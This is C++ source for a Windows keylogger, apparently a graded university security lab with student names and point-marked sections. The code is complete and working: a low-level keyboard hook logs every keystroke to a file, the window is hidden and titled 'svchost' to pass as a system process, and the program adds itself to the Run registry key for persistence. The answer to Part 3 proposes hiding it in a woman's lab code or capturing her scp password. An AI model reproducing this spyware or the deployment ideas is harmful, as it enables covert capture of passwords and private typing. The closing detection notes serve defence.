// Project location: C:\Users\cse5380\Documents\Visual Studio 2010\Projects\keylogger

/*
 * Name: Vighnesh Sivaraman
 * Student ID: 1001878596

 * Name: Hamza Alwani
 * Student ID: 1001638905

 * Name: 
 * Student ID:
*/



/**
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

using namespace std;

#define	DEBUG 1
#define CLASSNAME "winkey"
#define WINDOWTITLE "svchost"

char windir[MAX_PATH + 1];
/***** Declare keyboard hook handle here  (2 pts.) *****/
/*keyboard hook handle*/ HHOOK kbdhook ;
/***** Declare keyboard hook handle here  (2 pts.) *****/
bool running;	/* Used in main loop */

/**
 * \brief Called by Windows automagically every time a key is pressed (regardless
 * of who has focus)
 */
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp) {
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		/*
		 * Get key name as string
		 */
		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;

		/*
		 * Non-printable characters only:
		 * Some of these (namely; newline, space and tab) will be
		 * made into printable characters.
		 * Others are encapsulated in brackets ('[' and ']').
		 */
		if (!printable) {
			/*
			 * Keynames that change state are handled here.
			 */
			if (str == "CAPSLOCK")
				capslock = !capslock;
			else if (str == "SHIFT")
				shift = true;

			/*
			 * Keynames that may become printable characters are
			 * handled here.
			 */
			if (str == "ENTER") {
				str = "\n";
				printable = true;
			} else if (str == "SPACE") {
				str = " ";
				printable = true;
			} else if (str == "TAB") {
				str = "\t";
				printable = true;
			} else {
				str = ("[" + str + "]");
			}
		}

		/*
		 * Printable characters only:
		 * If shift is on and capslock is off or shift is off and
		 * capslock is on, make the character uppercase.
		 * If both are off or both are on, the character is lowercase
		 */
		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			} else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

        /***** Write key-string to a textfile in your machine in this portion  (8 pts.) *****/
		fstream file_out;
		file_out.open("data.txt",std::ios_base::app | std::ios_base::in);
		if(file_out.is_open())
		{
			file_out<<str;
		}
        /***** Write key-string to a textfile in your machine in this portion  (8 pts.) *****/
	}

    /*** Pass the hook information to the next hook procedure in the current hook chain in this portion  (3 pts.) ***/
			return CallNextHookEx(kbdhook,code,wp,lp);
    /*** Pass the hook information to the next hook procedure in the current hook chain in this portion  (3 pts.) ***/
}

/**
 * \brief Called by DispatchMessage() to handle messages
 * \param hwnd	Window handle
 * \param msg	Message to handle
 * \param wp
 * \param lp
 * \return 0 on success
 */
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
	switch (msg) {
		case WM_CLOSE: case WM_DESTROY:
			running = false;
			break;
		default:
			/* Call default message handler */
			return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline, int ncmdshow) {
    /******************** This portion of the code declares necessary variables and structures ********************/

    /***** What should be the data type to handle these two windows windows?  (2 pts.) *****/
    /*data-type to handle window*/ HWND hwnd;
    /*data-type to handle window*/ HWND fgwindow = GetForegroundWindow();    /* Current foreground window */
    /***** What should be the data type to handle these two windows windows?  (2 pts.) *****/


    MSG msg;
    /***** Which structure contains window class information?  (2 pts.) *****/
    /*structure*/ WNDCLASSEX windowclass;
    /***** Which structure contains window class information?  (2 pts.) *****/


    /***** What should be the data type to handle a module?  (2 pts.) *****/
    /*module-handler*/ HMODULE modulehandle;
    /***** What should be the data type to handle a module?  (2 pts.) *****/

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor  = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;
    /******************** This portion of the code declares necessary variables and structures ********************/

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	/***** You need to write the code for part 2 here, return to this section when you finish part 1  (12 pts.) *****/

	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath,MAX_PATH);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue, "KEYLOGGER", 0, REG_SZ, (LPBYTE) szPath, sizeof(szPath));
	RegCloseKey(newValue);



	/***** You need to write the code for part 2 here, return to this section when you finish part 1  (12 pts.) *****/

	/***** Create your window here  (4 pts.) *****/
	hwnd = CreateWindowEx(
		0,
		CLASSNAME,
		"Keylogger",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,
		NULL,
		thisinstance,
		NULL);


	/***** Create your window here  (4 pts.) *****/

	/***** This line should make the window invisible  (2 pts.) *****/
	ShowWindow(hwnd,0);
	/***** This line should make the window invisible  (2 pts.) *****/
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

	/***** Hook keyboard input in this part  (8 pts.) *****/
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL,handlekeys,thisinstance,0);

	/***** Hook keyboard input in this part  (8 pts.) *****/
	
	running = true;

	GetWindowsDirectory((LPSTR)windir, MAX_PATH);

	/*
	 * Main loop
	 */
	while (running) {
		/*
		 * Get messages, dispatch to window procedure
		 */
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false;
            /*
			 * This is not a "return" or
			 * "break" so the rest of the loop is
			 * done. This way, we never miss keys
			 * when destroyed but we still exit.
			 */
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

/********** Call your TA and show him/her that step 1 and 2 works  (10 pts.) **********/
// Finish both parts
/********** Call your TA and show him/her that step 1 and 2 works  (10 pts.) **********/



/* Part 3:  (2 pts.)
Answer:
Idea 1:
	embed the keylogger code within the lab4 code so when she builds and runs it the keylogger also runs and is put in the regsitry

Idea 2:
	run the keylogger on our computer and when she logs in to scp (transfer files to her pc) we get the password.


*/


/* Part 4:  (3 pts.)
Answer:
Check for suspecious processess running in the task manager and anything in the startup registry. 

We can have an application checking for backround applications that are taking all keystrokes and is running for a long time also if is present in startup registry.
If this checkes out we can notify the user and can ask if we can kill and remove the process from the system.

*/